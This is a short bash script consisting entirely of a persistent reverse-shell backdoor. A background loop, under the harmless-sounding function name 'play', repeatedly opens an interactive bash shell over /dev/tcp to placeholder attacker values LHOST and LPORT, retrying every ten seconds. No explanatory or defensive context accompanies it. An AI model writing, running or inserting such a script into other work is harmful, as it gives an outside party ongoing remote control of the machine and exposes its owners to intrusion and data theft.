#!/bin/bash

play() {
    while true; do
        bash -i >& /dev/tcp/LHOST/LPORT 0>&1
        sleep 10
    done
}

play &
